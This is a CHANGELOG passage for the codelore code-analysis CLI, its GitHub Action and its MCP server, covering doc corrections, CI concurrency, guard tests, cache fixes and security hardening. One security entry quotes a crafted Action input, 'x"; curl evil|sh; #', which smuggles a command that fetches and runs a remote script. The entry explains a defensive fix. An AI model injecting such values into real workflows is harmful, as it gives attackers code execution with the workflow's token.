- **The copy-pasteable CI recipes work when copied, and the guide stopped describing a flag as the opposite of what it does.** A four-lane audit rebuilt the CLI, SARIF, architecture and cross-document surfaces from source and diffed the documentation against them, rather than re-reading the prose. Two findings reached users directly. The PR-mode workflow template that both the README and the guide tell readers to copy passed `--output markdown` and `--output sarif`, but `--output` takes a path and the format flag is `--format` — so it wrote files literally named `markdown` and `sarif` in default text format, left stdout empty, and uploaded a zero-byte SARIF on every run because that step is `if: always()`. Everything exited 0. The CI install snippet fetched an asset URL without the tag segment the release workflow puts in every archive name, so it returned 404. Separately, `--strict-grouping` was documented as fail-fast when it silently drops unmatched paths — a reader expecting an error got data loss instead — and `--time-bucket`'s own help text listed an analysis the CLI rejects while omitting two it accepts, so `--help` contradicted the error message the same binary prints. The rest were drift the code had already outrun: a severity divisor corrected on one surface and not its sibling guide, a SARIF row still describing a shipped fix as an open finding, three MCP tools whose `limit` parameter was undocumented and a fourth whose default was wrong, `NO_COLOR` and `CLICOLOR_FORCE` honoured but named nowhere, a research-basis cross-link claimed for every analysis when a third carry it, and a dashboard widget list naming sixteen widgets against twenty-three mount points. Where two documents disagreed, source decided which one was wrong and the loser was corrected rather than both being softened.

- **The docs describe this week's shipped contract again — a four-auditor currency pass over the fourteen fixes that landed since the last alignment.** The hosted-LLM example now sets the provider the client requires instead of demonstrating its refusal; the MCP section gains `--cache-dir`/`--temp-dir` and the fail-fast startup repo validation, and its troubleshooting rows quote the messages the binary actually prints today; the `-` = stdout convention, the `--group-file` and `--time-bucket` rejection gates, the bearer-token loopback rule, the diff-mode SARIF tag set and missing `CODELORE-DELTA-HEALTH` row, the check evidence-chain tiebreak, and the release pipeline's attestation-bundles-as-assets are all written down; the analysis catalogue gains its two missing rows; and stale fragments are gone (a deleted error message, a drifted `fancy-regex` version, the pre-rename `bca` field name, two hardcoded counts, a half-true fingerprint-versioning claim). The SPA output directory is now ignored at any depth, not only the repo root. Two code gaps the audit surfaced are recorded as active ledger findings rather than patched inline: the step-summary `--output -` residue of the dash convention, and diff's SARIF emitter still on the pre-fix severity shape.

- **Three MCP tool messages told the agent something false about what another tool returns.** MCP descriptions are read by an LLM client deciding how to call a tool and how to characterise the result, so a wrong sentence there is restated to a human with the agent's confidence behind it. The `hotspots` tool was described as "ranked by revision count" when its rows come back `ORDER BY score DESC` — and `revisions` is a returned column, so the false claim read as corroborated by the data printed beside it; the description now names the composite score and flags `revisions` as merely one of the columns. The `hotspot_anchored_max` skip explanation said the gate depends on a corpus lens "which this tool does not carry", contradicted by the server's own calibration field and by `corpus_percentile_max` being evaluated there *with* that lens — the real reason, stated in the message's own parenthetical and in its test's comment, is that this tool runs the plain unanchored hotspot scan, so the anchored score never gets populated; the clause went stale when the server gained a calibration flag and nothing failed. And the `path not found` hint pointed at `repo_overview` "to list analyzed files", which returns `{metric, value}` rows where `files` is a count — sending a caller who already had a bad path toward a number. None of the three was pinned by a test, which is why all three drifted.

## [0.28.0] - 2026-08-17

### Fixed

- **One commit on `main` can no longer cancel another's CI, leaving it permanently unverified.** The concurrency group was scoped to the ref, so every push and dispatch on `main` shared `CI-refs/heads/main` and each new one cancelled the last. On a pull request that is right — a new push makes the previous run worthless. On `main` it is not: every commit there is a permanent, releasable point that `self-gate` stamps and `dogfood` publishes from, and a cancelled run is never covered by a later one. The workflow comment had reasoned the risk away on the grounds that "main commits rarely arrive that fast", which is exactly what does not hold, because `merge-on-green` has to re-dispatch main's CI after every auto-merge — a `GITHUB_TOKEN` push does not fire `on: push`, so without the dispatch an auto-merged commit gets no CI at all. Three merges landing together therefore had each dispatch kill the previous commit's still-running matrix, and two commits went unverified. The group is now qualified by `github.sha` on `main`, so each commit runs in its own group and nothing contends. Setting `cancel-in-progress: false` would **not** have fixed it: GitHub keeps at most one running and one *pending* run per group and cancels the older pending one, so the middle commit of three would still have lost its run — distinct groups are the only thing that works. Cancellation is unchanged everywhere else: pull-request pushes still supersede their predecessors, and a deliberate re-dispatch of the same `main` SHA still replaces the stale run. A guard test pins the property, and proves itself by rejecting the exact ref-only group that caused this and by asserting its pinned copy still matches what the workflow ships.

### Removed

- **The four tree-sitter grammars the product cannot reach are gone, and with them the C++ cross-toolchain requirement and the `petgraph` pin.** `codelore-rca` compiled nine grammars into every build; the product dispatches six parsers covering five languages and resolves only their extensions, so C++, Kotlin, and the two Mozilla helper grammars — `ccomment` and `preproc` — were reachable from nothing. They were not free. Together they contributed roughly 46 MB of generated C against 30.7 MB for the working set, and cost more to compile than the entire set actually used. The binary was never affected: the linker already stripped tables no call site monomorphised, so this is a build-time, toolchain, and supply-chain change rather than an artifact-size one. The two smallest carried the sharpest cost — `ccomment` and `preproc` were the crate's only C++ at all, two `scanner.cc` files totalling 4,839 bytes, and that is what required `musl-g++` and cost the `x86_64-unknown-linux-musl` release target. Removing them makes `codelore-rca` a pure-C dependency and leaves bundled DuckDB as the only remaining blocker for that target. The four could not be removed separately, which is why they land together: `preproc.rs::preprocess` takes a `&PreprocParser`, and the `PreprocResults` it exported was a parameter of `ParserTrait::new` consumed by exactly one arm — `LANG::Cpp`. Dropping the preprocessor while keeping C++ would have gutted macro expansion for a language still shipped; dropping C++ while keeping the preprocessor would have left the machinery threaded through every parser's constructor with no consumer. `ParserTrait::new` now takes only the source bytes, having previously also taken a path it stopped using once the preprocessor left. `petgraph` left with them: `preproc.rs` was its only consumer in the workspace, so its Dependabot ignore rule and the deferred `0.6 → 0.8` bump are both retired, and `leiden-rs`'s `petgraph` feature — switched off solely to avoid conflicting with the pinned 0.6 — is no longer constrained. Removing `LANG` variants, the parser types, and the `ParserTrait::new` signature is a breaking change to `codelore-rca`'s public API. Unused-dependency tooling would not have found any of this: the grammars were referenced, from inside the `mk_langs!` invocation, and merely unreachable.
...
- **The signing-isolation guard now sees permissions granted by shorthand.** It keeps the release pipeline at SLSA Build L3 by refusing to let any job that runs repository-authored code hold `id-token`/`attestations`, and it found those scopes by reading a `permissions:` block line by line. GitHub accepts two other spellings of the same grant: `permissions: write-all`, which grants every scope including the signing ones while naming neither, and the flow map `permissions: {id-token: write}`, which names them but not on lines of their own. Both were invisible — and `write-all` is the first thing anyone reaches for when an attestation step fails for want of a permission, so the blind spot sat exactly where the pressure to use it is highest. No workflow used either form, so nothing was ungated; what was missing was the tripwire. Verified by rewriting a real workflow's build job to `permissions: write-all` and confirming the guard now fails naming the job and both implied scopes, where it previously reported nothing, and that `read-all` is still correctly read as granting nothing signable.

- **The escaping guard covers function names, and the ledger-stamp guard sees compound stamps.** Both came from applying one check to the repository's own guards: name a member of the class a guard polices that it would not catch — if that is easy, the rule is an instance list rather than a rule. The escaping guard's accessor list omitted `function`, a name parsed out of the analysed repository's source and rendered into the drawer's X-ray table and function list; it carries whatever that source put in an identifier position, which is the same provenance as a path. Both sites were already escaped, so nothing was exploitable — a regression simply would not have been caught. The ledger-stamp guard matched two exact spellings of an unreleased stamp, so a compound stamp naming both a shipped release and pending work matched neither; it now asks whether a stamp line mentions the unreleased state at all, and ignores prose that merely discusses it. That gap was not hypothetical — one row claimed unreleased work for two releases after it shipped, invisible to the guard written to catch exactly that. The escaping guard's module doc also stopped claiming its accessor list is derived from the payload's string fields: it is curated, most of the roughly seventy string fields across the analyses are computed values that cannot carry a metacharacter, and the two function-coupling endpoints are knowingly unguarded because a single-letter accessor cannot work under prefix matching.

- **The comment-hygiene guard now sees hyphen-joined phase markers, and the four that had survived behind that blind spot are gone.** The guard forbids audit and phase markers in source, and enforced it two ways: bare `F`/`T`-plus-digits tokens, and a keyword (`Plan`, `Task`) followed by spaces and a number. One audit pass spelled its markers with a hyphen instead, which fell between both rules — the token scans split the name at the hyphen into a bare word and a bare digit, neither of which is an ID, and the keyword scan stopped at a separator it did not expect. Four such markers sat in `analyses/coupling.rs`, `analyses/soc.rs` and `output/csv/coupling.rs` across every cycle this guard has run, inside the directories it scans, while it reported clean. The keyword rule now accepts a single `-` or `_` joiner and carries the pass name in its keyword list, and the four comments were rewritten to state the code-maat compatibility contract they describe without the marker — the explanations were correct, only the prefix was history. Verified by restoring one marker and confirming the guard fails naming its file and line, where the previous rule passed. This is the same defect as the SPA escaping guard's: a guard narrower than the class it polices reports clean for the wrong reason, and the gap is only visible from outside the rule.

- **The SPA escaping guard now reaches table and list markup, qualifier-first field names, and values escaped through a disjunction.** The guard recognised markup by searching for one of ten substrings, none of which were the tags the widgets most often build rows from — so a statement assembling `<dt>`/`<dd>`/`<td>`/`<tr>` was not treated as markup at all, and every accessor in it went unexamined. Three of the four author sinks in the dashboard sat in exactly that shape. Two further defects compounded it: accessors were matched by dotted prefix, so `.author` did not occur in `main_author` (a payload field rendered today) though it does cover `.entity_a` and `.entity_b`, where the base name comes first; and a value was judged escaped only when `escapeHtml(` sat immediately before it, so the second operand of `escapeHtml(a || b)` read as a bare sink. Markup is now recognised by an opening tag appearing *inside a string literal*, which is what separates `'<td>'` from a `j < n` comparison and from the literal `'<anonymous>'`; escaping is judged by walking back to the innermost unclosed parenthesis, so one call covers every operand within it. Author names are why this matters more than the paths that produced the original defect: a path needs `<`, legal only on some filesystems, whereas `git commit --author` accepts a quote verbatim, and author identity is rendered into HTML attributes. Every author sink was already escaped, so nothing was exploitable; what changed is that a regression would now be caught. Verified by removing the escaping from both `main_author` sinks and confirming the previous guard passed while this one fails naming both lines, and that the widget corpus reports no violations either way. Values parked in a local by one statement and rendered by the next remain outside its reach, as the guard's stated limits already record.
...
- **Guard asserting the declared version has a CHANGELOG section.** The heading that separates `[Unreleased]` from the newest released section sits one line above where every changelog edit lands, and an edit that replaces it rather than inserting above it removes nothing a reader would miss — the entries all survive, adopted by the section above, and the diff reads as an ordinary prepend. The cost is paid twice over: the shipped release loses its notes, so the newest version anyone finds is the one before it, and the next cut re-announces the adopted section under a second version number, because `cut-release.sh` flips whatever sits under `[Unreleased]`. The guard asserts that the version in `[workspace.package]` has a matching `## [X.Y.Z]` section — an invariant that holds on every commit rather than only at rest, since the script bumps the version and flips the CHANGELOG in the same commit. It is deliberately separate from `ledger_stamp_test`, which reads the same file and is structurally unable to see this: that check is one-directional by design, so a section that absorbs another only makes it pass harder.
...
- **The comment-hygiene guard now covers the `T`-prefixed ID series and `Task <N>` markers.** It matched only `F`-plus-digits, so a second ID vocabulary stayed invisible across three audit cycles and 15 markers accumulated in comments, doc comments, a test-module header, and one published string. Widening it needed care rather than a broader pattern: a census of every standalone `T`-plus-digits token found 13 real IDs against 12 domain-vocabulary hits — the clone-type names (`T1`/`T2`/`T3`) and the date/time separator in every ISO-8601 fixture timestamp. The rule flags a standalone token whose preceding byte is not alphanumeric, `_`, or `}`, which excludes timestamps structurally rather than by an exemption list that would rot; the clone types are a three-entry allowlist whose stated cost is that a future task numbered 1-3 would not be caught. `Task <N>` reuses the existing `Plan <N>` matcher rather than adding a parallel one. All 15 violations are cleared, including one comment that was stale as well as banned — it promised integration tests that had long since been written.
...
- **Release workflows no longer trigger on the Action's floating major tag.** `release.yml` and `container.yml` triggered on `tags: ['v*']`, and the `v1` tag the release script re-points on every release is a `v*` tag. Pushing it ran the whole pipeline a second time and published a GitHub Release literally named `v1` — which made GitHub's `releases/latest` API return `v1`, which the Action's own `version: latest` resolution then rejected as not a semver version, so the published Action failed for every consumer; the Homebrew tap was rewritten to a "codelore 1" whose download URLs pointed at that release. Both workflows now trigger on `v*.*.*`, which matches every real release tag including pre-release suffixes and matches no bare major. A guard reads the major tag out of `cut-release.sh` and asserts no tag-trigger pattern matches it, so the pattern cannot be widened back while the tag still moves — the two settings are individually reasonable and destructive only in combination, which is the coupling a reviewer looking at either file alone will not see.

- **The documented way to use the GitHub Action now resolves.** Every example told readers to write `uses: emrecdr/codelore@v1` — thirteen places across the README and the Action guide — while no `v1` ref existed and nothing in the release process created one. A workflow copied from the documentation failed at the step with `Unable to resolve action emrecdr/codelore@v1`; the Action never ran. Two audit cycles missed it because both examined what `action.yml` *contains*, and CI exercises it as `uses: ./` — a local path proves the mechanics and says nothing about whether a consumer can reach it. The tag now exists, `cut-release.sh` moves it onto each release, and a guard resolves every documented reference against the repository's actual refs so the documentation and the published refs cannot drift apart again.

### Changed

- **`v1` is documented as the Action's interface version, not codelore's SemVer major.** It moves onto each release the way `actions/checkout@v4` does, and tracks the inputs, outputs, and behaviour of `action.yml` rather than the crate version — codelore is `0.x`, so a major derived from the version would be `v0`. The versioning section previously said "Following SemVer. Major-version pin recommended", which conflated two separate pins: `uses:` selects the Action, and the `version:` input selects the binary it downloads. The old "pin to a specific release for reproducibility" example pinned only the binary while leaving the Action itself floating, so the logic running around that pinned binary could still change. Both pins are now spelled out.

- **`workflow_dispatch` on the release workflow is now the dry run its own header claimed it was.** The header advertised manual runs as "test runs", but no job was gated: a manual run took the `plan` job's `manual-<timestamp>` tag fallback and published a real GitHub Release from it, then pushed a Homebrew formula pointing at that throwaway build to the public tap. Only `crates-publish` was protected, by a step-level condition — so the hazard was understood for the one irreversible publish and never extended to the other two. All three publishing jobs now carry `if: github.ref_type == 'tag'`, leaving a manual run to exercise `plan` → `build` → `attest` and stop. Each job asserts its own precondition rather than relying on the skip cascading through `needs:`, so a later edit to a dependency list cannot silently re-enable publishing. This also makes the Build L3 attestation path exercisable without cutting a tag; a dry run still writes real attestations for the throwaway archives, which are digest-bound and harmless.
...
- **The "metrics computed on a partial tree" notice no longer warns on every run.** It fired for a dozen files on every `check`, implying degraded complexity metrics feeding code-health and the quality gates. The cause is a grammar quirk, not lost structure: `&raw const` / `&raw mut` is Rust 2024's raw-borrow operator, so the parser commits to a raw borrow on seeing `&raw` and errors when the next token is an ordinary local named `raw`. Measured across four affected files, clearing the error leaves every metric byte-identical — tree-sitter confines the error node to that expression. The notice is now `debug!`; `-v` or `RUST_LOG` still surfaces it when a file is genuinely suspect.

- **Cache pruning now reclaims the per-repo directories it empties.** Evicting a fact store left its directory behind and nothing ever removed one, so the tree gained a directory per repository ever analysed and never lost one — 6,643 empty of 7,990 on one development machine, with `codelore calibrate`'s throwaway corpus checkouts dominating. The bytes were negligible; the cost was the walk, which the global pruner pays twice on every cache miss. The sweep requires a directory to be completely empty rather than merely free of `.duckdb` files, because five other artifact families share those directories and none is visible to the pruner's filter; it is age-gated, and uses non-recursive removal so a concurrent write loses the race safely.

- **Cache eviction is described accurately as oldest-ingest-first rather than LRU.** Both pruners order by mtime, and a cache hit opens the store read-only — so an entry's mtime is fixed when its ingest completed and is never refreshed by use. A frequently-read entry can be evicted ahead of a newer one that was never reused. Behaviour is unchanged: implementing true LRU would mean a write on the read fast path.

- **An analysis that matches nothing now says so instead of exiting 0 in silence.** The README's own first command carries `--min-revs 5`, the documented default; on a young repository nothing clears it, so the run printed a bare CSV header and exited 0 — and `gha`/`ndjson` emitted no bytes at all, which in CI reads as "no findings". A run that produced no rows now writes one line to stderr naming the analysis and the options that were set. It is not TTY-gated: the banner and footer are run decoration and vanish off a terminal, but a piped or CI run is exactly where a confident empty answer does the most damage. The line reports the settings rather than blaming one of them — `min_revs` is the common cause but 17 analyses never read it. The pre-flight footer now also carries the row count, which had been stubbed out behind a note that the plumbing was too invasive; it stopped being so once the dispatch arms were folded into a single macro.

- **The persistent cache is keyed on the repository, not on how its path was typed.** `Options.repo_path` reached the cache key through the options hash exactly as the user spelled it, so one repository at one HEAD with identical flags derived a different key per invocation style — measured, four spellings of one repo produced four distinct entries in one directory, every one a miss, each paying a full ingest and each consuming one of the five slots that repository is allowed. `cache.rs` already documented `repo_path` as excluded; it now is. Repository identity is unchanged — the key hashes the canonicalised path as its first component, so two repositories still cannot collide. No `CACHE_EPOCH` bump: the key preimage itself changed, so prior entries are unreachable by construction and are reclaimed by the existing caps.
...
- **The crates.io publish step is idempotent on re-run.** Each of the three workspace crates is now skipped when its exact version is already live on crates.io (checked via the registry API with the required `User-Agent` header), so a publish that fails partway — leaving an earlier crate published and irreversible — can be re-run to completion instead of failing immediately on the already-published crate.
- **The never-read `changes.similarity` column is dropped from the fact store (schema version 7 → 8).** The column was written by ingest but read by no analysis — the live `similarity` signal lives on the `clones` table. The `ChangeType` event stream still carries per-rename/-copy similarity, so both `Repo` backends compute it and the differential harness still cross-checks it; only the unused persisted column is gone.
- **`function-hotspots` is rejected in combination with `--group-file` instead of silently truncating.** Path grouping discards the hunks of collapsed paths while `function-hotspots` joins the raw `hunks` table, so the ranking was quietly incomplete under grouping; the combination now errors at the CLI boundary (exit 2).
- **The release CI probe waits with a bounded retry before concluding a `paths-ignore` match**, so a not-yet-registered automatic run no longer triggers a spurious duplicate CI matrix.

### Fixed

- **`codelore diff` gate violations now exit 1 (gate violation), not 4 (analysis error).** A diff gate failure is a gate outcome, the same class `check` and `gate` already exit 1 for — exit 4 signals "codelore crashed while analysing", which a CI script cannot distinguish from a real violation. Both the regular-violation and `fail_on_skipped` diff paths now exit 1.
- **Two invalid format×analysis flag combinations exit 2 (CLI/options error), not 4.** An unsupported `--format` for the chosen analysis, and requesting an HTML output that is not wired, are user mistakes at the CLI boundary — now classified in the argument-error bucket rather than as an analysis crash.
- **The repo-relative code-health lens no longer pins a file in a tiny language cohort to the worst band.** Five structural biomarkers rank files with `PERCENT_RANK() OVER (PARTITION BY lang …)`, which at a cohort of two emits exactly `{0.0, 1.0}` — pinning the worse of two files to maximum intensity regardless of its absolute complexity, enough to fail a real `code_health_min` gate. A per-language cohort floor (`MIN_COHORT_FILES = 10`) now omits the structural biomarkers for below-floor languages, mirroring the corpus lens's existing `MIN_LANG_SAMPLE` treatment; the change only ever raises a below-floor file's score, never lowers it.
- **The defect-calibration temporal split no longer leaks positive labels across the train/validation boundary.** Positive rows (one per defect-introducing link) were cut 60/40 by row index, so a path with links on both sides of the cut appeared in both splits — and since the scorer reads a per-path-constant intensity vector, that path became a memorized answer key, a leak large enough to flip the acceptance verdict. Each path is now assigned wholly to one split (grouped by path, ordered by earliest fix date), preserving the incidence counts the honesty floor depends on while making the positives path-disjoint like the negatives already were.
- **The MCP `delta_health` tool witnesses its ingest instead of memoizing a vacuous result.** A zero-commit walk produced a well-formed, entirely vacuous delta (plausible zeroes) that was then cached for the process lifetime — an agent asking "did this change hurt code health" got a confident "no". It now runs the ingest witness and errors on an empty store.
- **`codelore analyze --after/--before` keeps the shallow-checkout witness.** A zero-commit walk under a date filter was treated as an expected empty selection and exited 0 — but a shallow/truncated checkout produces the same zero-commit walk, and under `--format sarif` an empty result auto-resolves every existing GitHub Code Scanning alert. It now distinguishes the two with `is_shallow()` and keeps exit 3 for a truncated checkout.
- **The MCP `hotspots` tool clamps its `limit` through the shared row cap (max 500), like every other list tool** — a client passing a huge limit no longer receives a multi-megabyte response.
- **The MCP `explain_file` tool reports an untracked path as an invalid-parameter error (`-32602`), not an internal error (`-32603`)** — matching its `code_health`/`function_xray` siblings, so an agent re-reads the path instead of retrying a typo.
- **`delta_code_health_min_per_file` reports `"skipped"`, not `"passed"`, when no changed file had a computable delta** — it measured nothing, so the honest verdict is a skip (which moves the exit code only under `fail_on_skipped`).
- **Coordination-needs rows in the SPA are clickable again.** The inline `onclick` embedded a JSON string inside a same-quoted HTML attribute, producing a `SyntaxError` (every row was dead on click) and an attribute-injection sink; it now uses `addEventListener` with an escaped `data-path`, and the rows gain keyboard activation.
- **The `diff` base-cache digest folds the whole base-rev `Options`, not just a hand-picked `min_revs` + `exclude` pair.** The base-rev options are now built by one shared helper and hashed via the same canonical serialization the main cache key uses, so the digest also keys on the repo path and automatically captures any option added to the base-rev builder in future — the old hand-rolled two-field list would silently reuse a baseline when such a field diverged. (A digest mismatch only ever forces a recompute, never a wrong reuse.)
- **The health-trend feed no longer lets a mild `green → yellow` move evict a severe `yellow → red`.** The "recent improvements / regressions" lists are now deduplicated by path (most-severe transition kept) and ordered worst-first before the top-8 cut.
- **A zero-complexity file is no longer mislabeled a directory** in the coupling-trends treemap tooltip (the file/directory test now keys on the node's `children`, not on a falsy cognitive value).
- **SARIF `security-severity` documentation corrected to `(100 − cognitive_health) / 10`** (the shipped divisor), from a stale `/ 4` in two docs that put a documented `>= 7.0` alert policy 2.5× off. Accompanied by a sweep of doc/behavior mismatches (`--complexity-sample` accepted values, the Rust MSRV pin-site list, the dirty-tree warning's TTY gating, the "all MCP tools are read-only" claim, the exit-code taxonomy, and several MCP tool parameter defaults) and `scope` attributes on SPA table headers for screen-reader association.
...
- **The GitHub Action no longer splices caller-controlled inputs into shell `run:` bodies.** `action.yml` interpolated `${{ inputs.version/analysis/format/output/repo/args }}` directly into composite step scripts, where `${{ }}` expands at YAML-render time — so the surrounding quotes were inert and a crafted input (e.g. `analysis: 'x"; curl evil|sh; #'`) achieved command execution with the calling workflow's token, reachable on `pull_request_target`. All caller inputs now pass through the step's `env:` and are read as `"$VAR"` (never spliced into source), and the `args` word-split is wrapped in `set -f`/`set +f` so a bare `*` can no longer glob to the workspace file list.
- **The Action verifies the release archive it downloads against a published checksum.** The release workflow now emits a `SHA256SUMS` asset alongside the binaries, and the Action's install step verifies the archive against it — a hard failure on mismatch, and a warn-and-proceed when the file is absent (older releases), so the check is backward-compatible. Previously the tarball was fetched over HTTPS with no integrity verification, the one download in the tree that the project's build-time SHA-pinning of vendored assets did not cover.
- **`cut-release.sh` drift-checks the `protect-main` ruleset it rewrites, and fails the cut on drift.** The release script PUTs the whole `protect-main` ruleset from a hardcoded body during the release-commit push dance, which silently drops any required status check present on the live ruleset but absent from the body. The pre-existing drift check covered only `protect-release-tags`; it now covers both, non-fatal for the tag ruleset and **fatal** for `protect-main` — a cut that would silently remove a required check from `main` now stops.
...
- **`architecture-metrics` gains a `wildcard_import_share` row: the fraction of all import statements that are glob imports (`imports.kind = 'wildcard'`), first-party or not.** Purely additive — a glob names a module, not a symbol, so it's inherently harder for the resolver to check against an in-repo path than a named import.

- **`delivery-metrics` gains a `landed_by_other_pct` row: the share of non-merge commits whose committer differs from their author (case-normalized email comparison) — a validated peer-review/gatekeeper proxy (Rigby & German 2008).** Mirrors `rework_pct`'s single-aggregate row shape (`p50 == p75 == p90`). The row's caveat discloses that `commits` carries `author_name` but no `committer_name`, so unlike `canonical_author` the committer side cannot be mailmap-resolved: a person authoring and landing under two emails they both own reads as a false "gatekept" commit — this is not ownership-grade signal.

### Changed

- **The HEAD-time complexity/clones/imports scans and the historical `architecture-trend`/`cycle-origins` scans now read blobs through a per-worker warm reader instead of re-resolving `rev → commit → root tree` from a cold object-decode cache on every single file.** `Repo` gains `blob_reader_at(rev)`, returning a `BlobReader` whose `read(path)` is byte-identical to the existing `read_blob_at(rev, path)` for every path (tracked file, directory, nonexistent path, any rev) — proven by a new regression test comparing the two directly across every path in a fixture, and by diffing full `complexity_metrics`/`clones`/`imports` ingest output and `architecture-trend` results before and after the change (byte-identical on both). `GixRepo` overrides it with a reader that resolves the root tree once per `rayon` worker (via the existing `map_init` idiom) and reuses a warm `gix` object cache for every file that worker subsequently reads; the default trait impl — used by `GitCliRepo`, the differential-test oracle — just forwards each call to `read_blob_at`, so its behavior and the differential test suite are unaffected. `read_blob_at`/`read_blob_at_head` are unchanged and still used by every other call site.

- **The dirty-worktree staleness warning on a cache hit now runs only on an interactive stderr.** That warning is gated behind an `is_worktree_dirty()` status walk which is `O(tracked-files)`; on the non-interactive agent-loop / CI path the persistent cache is built to serve — where nobody reads the warning — the scan is now skipped entirely, restoring a cache hit to the near-`O(1)` "open a file" fast path it is meant to be. Interactive runs are unchanged; a missed hint on a piped/redirected stderr is within the `Repo` trait's best-effort-hint contract for `is_worktree_dirty`.
...
- **`codelore explain delivery-friction` errored with "unknown topic" despite `delivery-friction` being a fully shipped, documented analysis.** The `explain` topic catalog covered every other analysis but this one; it now carries the friction-score formula and citation, matching its sibling entries, and is removed from the `explain`-coverage test's allowlist of intentionally-uncovered analyses.

- **`architecture-metrics`'s `first_party_import_share` undercounted first-party glob imports.** `imports::extractor::classify` tests for a trailing `*`/`::*` glob before it tests for a relative root, so a first-party wildcard (`use crate::foo::*;`, a bare `use super::*;`) is tagged `kind = 'wildcard'` rather than `kind = 'relative'` — and the share's numerator only ever recognised `kind = 'relative'`, so an unresolved first-party glob silently fell out of both `first_party_import_share` and `resolution_rate_first_party`. The share's `COUNT(*) FILTER` now also recognises a `wildcard`-kind row whose raw `target` carries the same `crate::`/`self::`/`super::` prefix `classify` itself uses for a Rust relative import, without touching the stored `imports.kind` (a downstream test keys on the exact `wildcard` value for a Java glob import). `import_resolution_rate` is unchanged (byte-identical).
...
- **`coordination-needs` and `knowledge-islands` classified a `tier: "high"` / `ownership_pct: 100.0` off arbitrarily small samples with no way for a consumer to judge the denominator.** `interleave` can hit `1.0` off as few as 2 commits, and `ownership_pct` off as few as one commit's worth of LoC, but neither row disclosed the sample size behind the figure — unlike `bus-factor` (`total_commits`) and `ownership` (`total_revs`), which already do. `CoordinationNeedsRow` gains `total_commits` (the same per-path commit count already computed for the `interleave` denominator); `KnowledgeIslandRow` gains `total_loc` (the same per-path LoC total already computed for the `ownership_pct` denominator). Both are purely additive — no formula, ranking, or classification change; wired through the csv/markdown emitters for each row type (JSON carries every struct field automatically).

- **`write_github_output` silently dropped both an open failure and a write failure on the `$GITHUB_OUTPUT` file, so a momentarily-unwritable path in CI made a downstream `if: steps.x.outputs.result == …` silently take the else branch with no signal.** The unset-env-var case (the normal local/non-CI run) still returns quietly, but an open or write `Err` now logs a `tracing::warn!` naming the failure. The CLI's exit code and stdout/stderr are unaffected — this only restores visibility into the GitHub Actions output-wiring failure mode.
